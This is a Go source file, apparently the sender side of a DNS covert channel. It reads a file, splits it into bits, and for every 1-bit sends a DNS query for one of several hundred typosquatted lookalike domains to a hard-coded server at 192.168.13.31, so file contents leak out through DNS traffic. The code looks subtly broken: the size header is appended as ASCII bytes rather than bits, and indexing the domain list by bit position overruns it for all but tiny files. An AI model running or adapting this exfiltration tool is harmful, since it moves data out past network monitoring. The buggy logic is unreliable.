// client.go
package client

import (
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/miekg/dns"
)

var DomainList = [...]string{"aaazon.com", "aahoo.com", "aamazon.com", "aapple.com", "aazon.com", "acebook.com", "aeazon.com", "afazon.com", "afcebook.com", "agazon.com", "ahazon.com", "ahoo.com", "ahple.com", "aing.com", "ajple.com", "akazon.com", "akple.com", "alple.com", "amaazon.com", "amafon.com", "amaion.com", "amajon.com", "amakon.com", "amanon.com", "amaon.com", "amapon.com", "amaqon.com", "amayon.com", "amazcn.com", "amazdn.com", "amazfn.com", "amazhn.com", "amazin.com", "amazln.com", "amazn.com", "amaznn.com", "amazo.com", "amazoa.com", "amazoc.com", "amazod.com", "amazoh.com", "amazok.com", "amazon.com", "amazonn.com", "amazoon.com", "amazoq.com", "amazor.com", "amazos.com", "amazot.com", "amazov.com", "amazoy.com", "amaztn.com", "amazxn.com", "amazyn.com", "amazzon.com", "amezon.com", "amfzon.com", "amizon.com", "ammazon.com", "amnzon.com", "amozon.com", "ampzon.com", "amuzon.com", "amzon.com", "anazon.com", "anstagram.com", "aople.com", "apazon.com", "apble.com", "apfle.com", "apjle.com", "apkle.com", "aple.com", "aplle.com", "apmle.com", "apnle.com", "appae.com", "appbe.com", "appce.com", "appe.com", "appfe.com", "appie.com", "appke.com", "appl.com", "appla.com", "applc.com", "apple.com", "applee.com", "applh.com", "appll.com", "applle.com", "applm.com", "applp.com", "applr.com", "applt.com", "applv.com", "appoe.com", "appple.com", "appre.com", "appse.com", "appue.com", "appve.com", "appwe.com", "appye.com", "apqle.com", "aprle.com", "apule.com", "asazon.com", "asn.com", "atazon.com", "awazon.com", "awitter.com", "awple.com", "ayhoo.com", "ayple.com", "bahoo.com", "bang.com", "bay.com", "bbay.com", "bbing.com", "bbng.com", "beay.com", "betflix.com", "bhng.com", "bicg.com", "bidg.com", "big.com", "biig.com", "biing.com", "bijg.com", "bimg.com", "bin.com", "bina.com", "binc.com", "bind.com", "bing.com", "bingg.com", "binj.com", "bink.com", "binkedin.com", "binl.com", "binng.com", "bino.com", "binp.com", "binr.com", "binu.com", "binx.com", "biny.com", "binz.com", "bisg.com", "bixg.com", "bizg.com", "bmazon.com", "bmng.com", "bng.com", "boogle.com", "bpng.com", "bpple.com", "bqng.com", "brng.com", "bsn.com", "bwitter.com", "bxng.com", "bzng.com", "cahoo.com", "cbay.com", "coogle.com", "coutube.com", "cpple.com", "csn.com", "dbay.com", "dikipedia.org", "doogle.com", "dpple.com", "dwitter.com", "eay.com", "eba.com", "ebaay.com", "ebac.com", "ebad.com", "ebah.com", "ebaj.com", "ebak.com", "ebao.com", "ebaq.com", "ebau.com", "ebav.com", "ebax.com", "ebay.com", "ebayy.com", "ebaz.com", "ebbay.com", "ebby.com", "ebdy.com", "ebey.com", "ebgy.com", "ebky.com", "ebly.com", "ebmy.com", "eboy.com", "ebqy.com", "ebxy.com", "eby.com", "eday.com", "eddit.com", "eebay.com", "eeddit.com", "eing.com", "ekay.com", "entflix.com", "epple.com", "erddit.com", "esay.com", "esn.com", "etflix.com", "euay.com", "ewitter.com", "exay.com", "eyay.com", "faacebook.com", "faaebook.com", "facabook.com", "facbook.com", "faccebook.com", "facebaok.com", "facebbook.com", "facebmok.com", "facebobk.com", "faceboek.com", "facebofk.com", "facebok.com", "facebolk.com", "facebomk.com", "faceboo.com", "facebooh.com", "facebook.com", "facebookk.com", "facebool.com", "faceboook.com", "faceboou.com", "faceboov.com", "facebotk.com", "facebowk.com", "faceboyk.com", "faceebook.com", "faceeook.com", "facefook.com", "faceiook.com", "facejook.com", "facenook.com", "faceook.com", "faceqook.com", "facesook.com", "facfbook.com", "facibook.com", "facrbook.com", "facsbook.com", "factbook.com", "faebook.com", "fafebook.com", "fajebook.com", "falebook.com", "faqebook.com", "fauebook.com", "favebook.com", "fazebook.com", "fcebook.com", "ffacebook.com", "fing.com", "fjcebook.com", "flcebook.com", "fpple.com", "fscebook.com", "gacebook.com", "gahoo.com", "gbay.com", "gdogle.com", "geddit.com", "getflix.com", "ggoogle.com", "gikipedia.org", "ging.com", "glogle.com", "gocgle.com", "godgle.com", "goggle.com", "gogle.com", "gokgle.com", "gooble.com", "goodle.com", "googae.com", "googbe.com", "googe.com", "googee.com", "googge.com", "googgle.com", "googie.com", "googje.com", "googke.com", "googl.com", "googla.com", "googlb.com", "googld.com", "google.com", "googlee.com", "googlg.com", "googlh.com", "googli.com", "googlk.com", "googll.com", "googlle.com", "googlp.com", "googlt.com", "googlu.com", "googlz.com", "googne.com", "googqe.com", "googse.com", "googue.com", "googwe.com", "googze.com", "gooile.com", "goole.com", "goolle.com", "goomle.com", "gooogle.com", "goosle.com", "gootle.com", "gooule.com", "goovle.com", "goowle.com", "goozle.com", "goqgle.com", "goutube.com", "govgle.com", "goxgle.com", "goygle.com", "gpple.com", "gsogle.com", "gvogle.com", "gwitter.com", "hacebook.com", "hbay.com", "hinkedin.com", "hnstagram.com", "houtube.com", "hsn.com", "hwitter.com", "iacebook.com", "ibng.com", "icstagram.com", "iestagram.com", "ietflix.com", "ifstagram.com", "igstagram.com", "iinstagram.com", "ikipedia.org", "ilnkedin.com", "ilstagram.com", "imstagram.com", "ing.com", "inhtagram.com", "injtagram.com", "inkedin.com", "inltagram.com", "innstagram.com", "insagram.com", "insbagram.com", "insdagram.com", "insgagram.com", "inskagram.com", "insstagram.com", "instaagram.com", "instabram.com", "instaeram.com", "instafram.com", "instagam.com", "instagcam.com", "instageam.com", "instaggam.com", "instaggram.com", "instagkam.com", "instaglam.com", "instagoam.com", "instagpam.com", "instagqam.com", "instagra.com", "instagraam.com", "instagrab.com", "instagram.com", "instagramm.com", "instagraq.com", "instagras.com", "instagrcm.com", "instagrfm.com", "instagrgm.com", "instagrhm.com", "instagrjm.com", "instagrm.com", "instagrqm.com", "instagrram.com", "instagrrm.com", "instagrum.com", "instagrwm.com", "instagrym.com", "instagtam.com", "instaguam.com", "instagvam.com", "instanram.com", "instaram.com", "instawram.com", "instazram.com", "instcgram.com", "instgram.com", "instkgram.com", "insttagram.com", "insttgram.com", "instugram.com", "instxgram.com", "instzgram.com", "intagram.com", "isstagram.com", "istagram.com", "iwkipedia.org", "iwstagram.com", "ixstagram.com", "iystagram.com", "jahoo.com", "jeddit.com", "joutube.com", "kahoo.com", "kinkedin.com", "koogle.com", "ksn.com", "lbay.com", "lcnkedin.com", "lenkedin.com", "letflix.com", "libkedin.com", "lickedin.com", "liinkedin.com", "likedin.com", "lilkedin.com", "lincedin.com", "lindedin.com", "linedin.com", "ling.com", "linkadin.com", "linkbdin.com", "linkcdin.com", "linkdin.com", "linkecin.com", "linkedan.com", "linkedcn.com", "linkeddin.com", "linkeden.com", "linkedfn.com", "linkedi.com", "linkedid.com", "linkedie.com", "linkedih.com", "linkedii.com", "linkediin.com", "linkedin.com", "linkedinn.com", "linkediw.com", "linkedn.com", "linkedpn.com", "linkeedin.com", "linkeein.com", "linkefin.com", "linkein.com", "linkelin.com", "linkemin.com", "linkepin.com", "linkeqin.com", "linketin.com", "linkevin.com", "linkexin.com", "linkeyin.com", "linkezin.com", "linkgdin.com", "linkkdin.com", "linkkedin.com", "linkudin.com", "linkwdin.com", "linkxdin.com", "linkzdin.com", "linnkedin.com", "linqedin.com", "linredin.com", "linuedin.com", "linwedin.com", "lirkedin.com", "liukedin.com", "livkedin.com", "lixkedin.com", "lizkedin.com", "llinkedin.com", "lmazon.com", "lnkedin.com", "lnnkedin.com", "lonkedin.com", "loogle.com", "lpnkedin.com", "lrnkedin.com", "lsn.com", "lwitter.com", "maazon.com", "mazon.com", "mbn.com", "mdn.com", "mgn.com", "mhn.com", "min.com", "ming.com", "mkn.com", "mln.com", "mmazon.com", "mmsn.com", "mn.com", "mnstagram.com", "mon.com", "moutube.com", "mqn.com", "ms.com", "msa.com", "msb.com", "mse.com", "msf.com", "msg.com", "msi.com", "msj.com", "msk.com", "msl.com", "msn.com", "msnn.com", "mso.com", "msq.com", "msr.com", "mssn.com", "msv.com", "msw.com", "msx.com", "msy.com", "msz.com", "mtn.com", "mun.com", "mvn.com", "mxn.com", "myn.com", "mzn.com", "nahoo.com", "natflix.com", "nbtflix.com", "nctflix.com", "neaflix.com", "neetflix.com", "nefflix.com", "neflix.com", "nekflix.com", "netalix.com", "netelix.com", "netfaix.com", "netfeix.com", "netfflix.com", "netfiix.com", "netfix.com", "netflbx.com", "netflex.com", "netflfx.com", "netflgx.com", "netflhx.com", "netfli.com", "netflib.com", "netflid.com", "netfliix.com", "netflik.com", "netflio.com", "netfliv.com", "netfliw.com", "netflix.com", "netflixx.com", "netflkx.com", "netfllix.com", "netfllx.com", "netfltx.com", "netflux.com", "netflx.com", "netflyx.com", "netfrix.com", "netfwix.com", "netfxix.com", "netfzix.com", "netglix.com", "nethlix.com", "netjlix.com", "netlix.com", "netnlix.com", "netolix.com", "nettflix.com", "netxlix.com", "netylix.com", "newflix.com", "nexflix.com", "neyflix.com", "nftflix.com", "ngtflix.com", "nhtflix.com", "nikipedia.org", "nistagram.com", "njtflix.com", "nktflix.com", "nnetflix.com", "nnstagram.com", "noutube.com", "npple.com", "nptflix.com", "nqtflix.com", "nrtflix.com", "nsn.com", "nstagram.com", "nstflix.com", "ntflix.com", "nttflix.com", "ogogle.com", "oing.com", "omazon.com", "oogle.com", "ooogle.com", "ooutube.com", "osn.com", "outube.com", "oyutube.com", "pacebook.com", "pahoo.com", "paple.com", "pbay.com", "ping.com", "pinkedin.com", "pnstagram.com", "pple.com", "ppple.com", "psn.com", "pwitter.com", "qeddit.com", "qetflix.com", "qing.com", "qwitter.com", "racebook.com", "raddit.com", "rahoo.com", "rbay.com", "rbddit.com", "rcddit.com", "rddit.com", "readit.com", "rebdit.com", "recdit.com", "redait.com", "redddit.com", "redddt.com", "reddet.com", "reddft.com", "reddi.com", "reddia.com", "reddib.com", "reddid.com", "reddiit.com", "reddik.com", "reddip.com", "reddiq.com", "reddit.com", "redditt.com", "reddiz.com", "reddmt.com", "reddnt.com", "reddot.com", "reddqt.com", "reddst.com", "reddt.com", "reddyt.com", "redit.com", "redjit.com", "redkit.com", "redmit.com", "rednit.com", "redqit.com", "reduit.com", "redvit.com", "redyit.com", "reeddit.com", "rehdit.com", "reidit.com", "rejdit.com", "reldit.com", "remdit.com", "reqdit.com", "rerdit.com", "rewdit.com", "reydit.com", "rezdit.com", "rfddit.com", "rinkedin.com", "rjddit.com", "rkddit.com", "rlddit.com", "rnstagram.com", "roddit.com", "routube.com", "rpple.com", "rrddit.com", "rreddit.com", "rwitter.com", "rxddit.com", "sacebook.com", "sahoo.com", "sbay.com", "sikipedia.org", "sing.com", "smn.com", "sn.com", "soogle.com", "spple.com", "tacebook.com", "tahoo.com", "taitter.com", "tditter.com", "teddit.com", "tfitter.com", "tgitter.com", "tiitter.com", "tinkedin.com", "titter.com", "tkitter.com", "tnitter.com", "tpitter.com", "tritter.com", "tsitter.com", "ttitter.com", "ttwitter.com", "tuitter.com", "twicter.com", "twiitter.com", "twijter.com", "twimter.com", "twister.com", "twitaer.com", "twitber.com", "twitcer.com", "twiter.com", "twitfer.com", "twither.com", "twitier.com", "twitqer.com", "twittar.com", "twittdr.com", "twitte.com", "twitteb.com", "twitteer.com", "twittef.com", "twittem.com", "twitten.com", "twitteo.com", "twittep.com", "twitteq.com", "twitter.com", "twitterr.com", "twittes.com", "twitteu.com", "twittev.com", "twittgr.com", "twittir.com", "twittor.com", "twittpr.com", "twittqr.com", "twittr.com", "twittter.com", "twittxr.com", "twitzer.com", "twivter.com", "twixter.com", "twiyter.com", "twjtter.com", "twktter.com", "twmtter.com", "twqtter.com", "twtter.com", "twttter.com", "twvtter.com", "twwitter.com", "twwtter.com", "tzitter.com", "uacebook.com", "ueddit.com", "uikipedia.org", "umazon.com", "usn.com", "uwitter.com", "vahoo.com", "vetflix.com", "vinkedin.com", "vmazon.com", "vsn.com", "wacebook.com", "wbay.com", "wiaipedia.org", "wieipedia.org", "wiikipedia.org", "wiipedia.org", "wikepedia.org", "wikidedia.org", "wikiedia.org", "wikieedia.org", "wikihedia.org", "wikiipedia.org", "wikipdia.org", "wikipeda.org", "wikipeddia.org", "wikipedea.org", "wikipedi.org", "wikipedia.org", "wikipediaa.org", "wikipedid.org", "wikipedii.org", "wikipediia.org", "wikipedik.org", "wikipedim.org", "wikipedin.org", "wikipedit.org", "wikipediy.org", "wikipedja.org", "wikipedma.org", "wikipedta.org", "wikipedya.org", "wikipeedia.org", "wikipeia.org", "wikipeiia.org", "wikipevia.org", "wikipeyia.org", "wikipfdia.org", "wikiphdia.org", "wikipjdia.org", "wikipkdia.org", "wikipndia.org", "wikippdia.org", "wikippedia.org", "wikiprdia.org", "wikipsdia.org", "wikiptdia.org", "wikipzdia.org", "wikiqedia.org", "wikisedia.org", "wikivedia.org", "wikiyedia.org", "wikkipedia.org", "wiklpedia.org", "wikopedia.org", "wikpedia.org", "wikrpedia.org", "wikspedia.org", "wikvpedia.org", "wing.com", "winkedin.com", "wiripedia.org", "wisipedia.org", "witter.com", "wkipedia.org", "wmkipedia.org", "wnkipedia.org", "woogle.com", "wpkipedia.org", "wqkipedia.org", "wsn.com", "wtitter.com", "wwikipedia.org", "wzkipedia.org", "xahoo.com", "xeddit.com", "xetflix.com", "xmazon.com", "xoogle.com", "xsn.com", "yaahoo.com", "yacebook.com", "yafoo.com", "yahao.com", "yahdo.com", "yaheo.com", "yahgo.com", "yahho.com", "yahhoo.com", "yaho.com", "yahoa.com", "yahob.com", "yahoc.com", "yahof.com", "yahog.com", "yahoh.com", "yahoo.com", "yahooo.com", "yahoq.com", "yahor.com", "yahov.com", "yahox.com", "yahqo.com", "yahro.com", "yahvo.com", "yahwo.com", "yahyo.com", "yahzo.com", "yaioo.com", "yakoo.com", "yaloo.com", "yanoo.com", "yaoo.com", "yasoo.com", "yatoo.com", "yauoo.com", "yawoo.com", "yaxoo.com", "ybhoo.com", "ydhoo.com", "ydutube.com", "yeddit.com", "yeutube.com", "yfutube.com", "ygutube.com", "yhoo.com", "yikipedia.org", "yjhoo.com", "ykhoo.com", "ykutube.com", "ylhoo.com", "ynhoo.com", "ynstagram.com", "yohtube.com", "yoltube.com", "yooutube.com", "yostube.com", "yotube.com", "youbube.com", "youeube.com", "yougube.com", "youpube.com", "youqube.com", "youtabe.com", "youtbe.com", "youtebe.com", "youtfbe.com", "youtqbe.com", "youttbe.com", "youttube.com", "youtub.com", "youtubb.com", "youtubbe.com", "youtubc.com", "youtube.com", "youtubee.com", "youtubg.com", "youtubh.com", "youtubk.com", "youtubo.com", "youtubp.com", "youtubs.com", "youtubu.com", "youtubv.com", "youtue.com", "youtuge.com", "youtuhe.com", "youtuke.com", "youtule.com", "youtuoe.com", "youtute.com", "youtuube.com", "youtuue.com", "youtuye.com", "youtwbe.com", "youtzbe.com", "youube.com", "youutube.com", "yphoo.com", "yrhoo.com", "yshoo.com", "ysn.com", "ythoo.com", "yutube.com", "yvhoo.com", "yvutube.com", "ywhoo.com", "ywitter.com", "yxutube.com", "yyahoo.com", "yyoutube.com", "yzhoo.com", "zacebook.com", "zeddit.com", "zikipedia.org", "zmazon.com", "zwitter.com"}

func StartSender(filename, dnsIP string) {
	serverAddr := "192.168.13.31:53"

	file_data := readFile(filename)
	// Tells us how big the file is so receiver knows not to segfault
	file_size := strconv.Itoa(len(file_data)) + ":"

	size_header := []byte(file_size)

	// Adding the header and data together
	payload := append(size_header, file_data...)
	fmt.Printf("Header: %b", size_header)
	fmt.Printf("First %b", payload[0])

	for i, b := range payload {
		// If bit = 1 query if not go next
		if b == 1 {
			msg := new(dns.Msg)
			fmt.Println("Querying " + DomainList[i])
			msg.SetQuestion(dns.Fqdn(DomainList[i]), dns.TypeA)
			c := &dns.Client{Timeout: 2 * time.Second}
			_, _, err := c.Exchange(msg, serverAddr)
			// TODO edit TTL? SHouldn't matter if we are using non-existant domains
			if err != nil {
				fmt.Println("Errror: " + err.Error())
			}
		}
	}
	fmt.Print("FIN SEND")
}

/*
Reads a given file and oputs it in an array of bits
*/

func readFile(path string) []byte {
	data, err := os.ReadFile(path)
	bit_file := make([]byte, 0)
	if err != nil {
		fmt.Println("Bad path")
		return nil
	}
	for _, b := range data {
		for i := 7; i >= 0; i-- {
			bit := (b >> uint(i)) & 1
			bit_file = append(bit_file, bit)
		}
	}
	return bit_file
}
